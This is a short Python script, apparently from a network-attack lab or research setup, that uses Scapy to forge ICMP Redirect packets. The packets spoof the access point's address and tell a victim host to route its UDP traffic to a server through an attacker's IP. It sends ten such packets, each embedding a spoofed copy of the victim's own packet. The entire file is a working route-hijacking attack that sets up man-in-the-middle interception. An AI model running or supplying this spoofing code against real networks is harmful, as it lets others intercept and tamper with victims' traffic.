from scapy.all import IP, UDP, ICMP, send
from const import Const

C = Const()

AP=C.AP
victim_tuple = C.victim_tuple
server_tuple = C.server_tuple
attacker_ip = C.attacker_ip

vic=victim_tuple[0]
actport=victim_tuple[1]
svr=server_tuple[0]
dport=server_tuple[1]

for i in range(10):
    # Define the original UDP packet
    original_ip = IP(src=vic, dst=svr)
    original_udp = UDP(sport=actport, dport=dport)
    udp_payload = b"Example UDP payload"
    original_packet = original_ip / original_udp / udp_payload

    # Create the IP header for the ICMP Redirect packet
    icmp_ip = IP(src=AP, dst=vic)

    # Create the ICMP Redirect packet
    icmp_redirect = ICMP(type=5, code=1, gw=attacker_ip) / original_ip / original_udp / udp_payload

    # Combine the IP layer with the ICMP Redirect
    full_icmp_packet = icmp_ip / icmp_redirect

    # Print the full ICMP Redirect packet
    print(full_icmp_packet.summary())
    # Send the ICMP Redirect packet
    send(full_icmp_packet)